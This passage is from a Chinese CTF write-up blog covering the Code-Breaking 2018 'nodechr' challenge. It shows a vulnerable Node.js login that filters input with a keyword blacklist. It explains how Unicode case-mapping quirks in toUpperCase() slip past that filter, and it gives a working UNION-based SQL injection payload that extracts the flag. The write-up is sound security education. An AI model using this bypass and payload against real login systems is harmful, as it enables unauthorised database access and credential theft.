+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="5-1-Unicode编码（或者urldecode）经过upper-和lower"><a href="#5-1-Unicode编码（或者urldecode）经过upper-和lower" class="headerlink" title="5.1 Unicode编码（或者urldecode）经过upper()和lower()"></a>5.1 Unicode编码（或者urldecode）经过upper()和lower()</h3><p><strong>python3和JavaScript都有这个特性。</strong></p>
+<blockquote>
+<p>toUpperCase()是javascript中将小写转换成大写的函数。<br>toLowerCase()是javascript中将大写转换成小写的函数。</p>
+</blockquote>
+<p>一般我们认为就是将 ASCII码 在127以内的字母进行大小写转换。但是换成其他Unicode编码呢。</p>
+<blockquote>
+<p>“ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。<br>“K”.toLowerCase() == ‘k’。<br>通过这个小特性可以绕过一些限制。</p>
+</blockquote>
+<p><strong>同样利用这个特性，也能绕过一些XSS。</strong></p>
+<p><strong>引用一句话：</strong></p>
+<blockquote>
+<p>这里的特殊部分是转换行为。并非所有Unicode字符在转换为大写字母时都具有匹配的表示形式 - <strong>因此浏览器通常倾向于采用外观相似，最适合的映射ASCII字符。</strong> 这种行为有相当大范围的字符，所有浏览器的做法都有所不同。</p>
+</blockquote>
+<p>相关演示：</p>
+<ul>
+<li><p>JS：<br>  <img src="./5-1.png" alt></p>
+</li>
+<li><p>python3：<br>  <img src="./5-2.png" alt></p>
+</li>
+<li>汇总：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">K ---- k</span><br><span class="line">ß(223) ---- SS</span><br><span class="line">ı(305) ---- I</span><br><span class="line">ſ(383) ---- S</span><br><span class="line">ﬀ(64256) ---- FF</span><br><span class="line">ﬁ(64257) ---- FI</span><br><span class="line">ﬂ(64258) ---- FL</span><br><span class="line">ﬃ(64259) ---- FFI</span><br><span class="line">ﬄ(64260) ---- FFL</span><br><span class="line">ﬅ(64261) ---- ST</span><br><span class="line">ﬆ(64262) ---- ST</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>括号里的数是十进制数，转成Unicode编码需要先转成十六进制。<br><img src="./5-3.png" alt></p>
+<h3 id="5-2-解题时被burpsuite坑了"><a href="#5-2-解题时被burpsuite坑了" class="headerlink" title="5.2 解题时被burpsuite坑了"></a>5.2 解题时被burpsuite坑了</h3><p>后台使用nodejs写的，但是对nodejs没有很熟悉，后台代码也只能看出个大概。一度认为没有回显，只能盲注。但真实的是登录上去后就会显示从数据库中取出的用户名。所以可以<strong>联合查询</strong>，将flag回显。</p>
+<p>在burpsuite的repeater模块中，构造好payload，发送过去，跳转到登录页面（错误情况下会显示错误，不会跳转），但并没有显示任何有用信息。</p>
+<p>当burpsuite抓到包后，直接构造好username和password，再发送，浏览器会显示flag。</p>
+<blockquote>
+<p>payload: username=aaa&amp;password=%27+un%C4%B1on+%C5%BFelect+1,(%C5%BFelect+flag+from+flags),’3</p>
+</blockquote>
+<p><strong>特别注意！！！：</strong><br>在浏览器中输入 <code>ı</code> 这个时，抓包在 burpsuite 中显示的 url编码 是 <code>%C4%B1</code>。但这个符号的 Unicode编码 是 <code>\u0131</code> 。<strong>发送过去还是以url编码为主。</strong></p>
+<h3 id="5-3-利用python3进行Unicode编码和url编码转换"><a href="#5-3-利用python3进行Unicode编码和url编码转换" class="headerlink" title="5.3 利用python3进行Unicode编码和url编码转换"></a>5.3 利用python3进行Unicode编码和url编码转换</h3><p>python3的url编码<strong>在 <code>urllib.parse</code> 这个包中</strong>，而不在 <code>urllib</code> 这个包中。</p>
+<p><img src="./5-4.png" alt></p>
+<hr>
+<p><img src="./5-5.png" alt></p>
+<p>Unicode编码 -&gt; url编码：<br><img src="./5-6.png" alt></p>
+<p><strong>记住：发送字符或者用burpsuite发送，不要写 <code>\u0131</code> ，要用url编码 <code>%C4%B1</code>。</strong></p>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一-easy-–-function"><span class="toc-text">一. easy – function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二-easy-–-pcrewaf"><span class="toc-text">二. easy – pcrewaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-正则表达式介绍"><span class="toc-text">2.1 正则表达式介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-NFA执行的回溯过程"><span class="toc-text">2.2 NFA执行的回溯过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-PHP的pcre-backtrack-limit限制利用"><span class="toc-text">2.3 PHP的pcre.backtrack_limit限制利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-FILES全局变量介绍及用法"><span class="toc-text">2.4 $_FILES全局变量介绍及用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-requests模块中POST一个多部分编码-Multipart-Encoded-的文件"><span class="toc-text">2.5 requests模块中POST一个多部分编码(Multipart-Encoded)的文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三-easy-phpmagic"><span class="toc-text">三. easy - phpmagic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-php-filter的妙用"><span class="toc-text">3.1 php://filter的妙用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-1-XXE中的利用"><span class="toc-text">3.1.1 XXE中的利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-2-巧用编码与解码"><span class="toc-text">3.1.2 巧用编码与解码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-3-利用字符串操作方法"><span class="toc-text">3.1.3 利用字符串操作方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-后缀名后加上-，pathinfo就取不到后缀名，且可以正常写入-php之中。"><span class="toc-text">3.2 后缀名后加上/.，pathinfo就取不到后缀名，且可以正常写入.php之中。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-SERVER-‘SERVER-NAME’-函数"><span class="toc-text">3.3 $_SERVER[‘SERVER_NAME’] 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-利用-base64-编码和解码写入shell"><span class="toc-text">3.4 利用 base64 编码和解码写入shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四-easy-phplimit"><span class="toc-text">四. easy - phplimit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-正则-R-介绍"><span class="toc-text">4.1 正则 (?R) 介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-技巧一：使用-get-defined-vars-函数"><span class="toc-text">4.2 技巧一：使用 get_defined_vars 函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-1-利用重点：-直接reset所有的变量"><span class="toc-text">4.2.1 利用重点： 直接reset所有的变量</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-直接列目录"><span class="toc-text">4.2 直接列目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#五-easy-nodechr"><span class="toc-text">五. easy - nodechr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-Unicode编码（或者urldecode）经过upper-和lower"><span class="toc-text">5.1 Unicode编码（或者urldecode）经过upper()和lower()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-解题时被burpsuite坑了"><span class="toc-text">5.2 解题时被burpsuite坑了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-利用python3进行Unicode编码和url编码转换"><span class="toc-text">5.3 利用python3进行Unicode编码和url编码转换</span></a></li></ol></li></ol>
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: FengHLZ</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://www.fenghlz.xyz/passages/Code-Breaking2018/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+      <div class="site-comment-contanier">
+  <p id="site-comment-info">
+    <i class="fa fa-spinner fa-spin"></i> 评论加载中
+  </p>
+  <div id="site-comment">
+  </div>
+</div>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">博客推荐</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://xin-tan.com/" target="_blank">GodBMW</a>
+          </span>
+        
+      </div>
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">在线工具</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://www.ilovepdf.com/zh-cn" target="_blank">iLovePDF</a>
+          </span>
+        
+          <span class="site-footer-item">
+            <a href="https://www.iloveimg.com/zh-cn" target="_blank">iLoveIMG</a>
+          </span>
+        
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: 2362929771@qq.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https:/godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content" style="height:55%;width:40%;">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control"/>
+      </div>
+      <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
+        
+          <div>
+            <img src="/images/wechatpay.png" alt="WeChat">
+            
+              <p>WeChat</p>
+            
+          </div>
+        
+          <div>
+            <img src="/images/alipay.jpg" alt="AliPay">
+            
+              <p>AliPay</p>
+            
+          </div>
+        
+      </div>
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+    <div id="local-search-result" style="height:50%;display:none;"></div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div></div>
+  <div class="bottom-bar-left">
+    <a href="/passages/2019-03-25-XSS练习笔记/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/passages/H5-CSS-JS-game/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+      <a href="#site-comment" data-enable="true">
+        <i class="fa fa-commenting"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    <a href="javascript:void(0);" id="site-reward">
+      <i class="fa fa-thumbs-up"></i>
+    </a>
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+    <a id="share-btn-twitter" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-twitter"></i>
+    </a>
+  
+  
+    <a id="share-btn-facebook" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-facebook"></i>
+    </a>
+  
+  
+    <a id="share-btn-weibo" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-weibo"></i>
+    </a>
+  
+  
+    <a id="share-btn-qq" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-qq"></i>
+    </a>
+  
+  
+    <a id="share-btn-wechat" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-wechat"></i>
+    </a>
+  
+</div>
+    
+  <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+  <script async>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', '');
+  </script>
+
+
+
+  <script async>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+  </script>
+
+
+
+  <script async>
+    (function(){
+    var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?":"https://jspassport.ssl.qhimg.com/11.0.1.js?";
+    document.write('<script src="' + src + '" id="sozz"><\/script>');
+    })();
+  </script>
+
+
+  </body>
+</html>
